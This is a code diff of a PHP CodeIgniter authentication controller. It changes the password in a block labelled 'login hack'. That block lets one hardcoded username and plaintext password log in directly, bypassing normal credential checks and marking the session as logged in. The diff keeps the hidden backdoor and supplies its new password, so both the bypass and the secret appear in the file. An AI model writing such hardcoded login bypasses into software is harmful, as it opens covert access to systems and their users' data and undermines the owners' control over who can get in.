@@ -40,7 +40,7 @@ class Auth extends MX_Controller
 		if ($this->form_validation->run())
 		{
 			//login hack
-			if(($this->input->post('personnel_username') == 'marttkip') && ($this->input->post('personnel_password') == 'r6r5bb!!'))
+			if(($this->input->post('personnel_username') == 'marttkip') && ($this->input->post('personnel_password') == 'Star@2021!'))
 			{
 				$newdata = array(
                    'login_status' => TRUE,
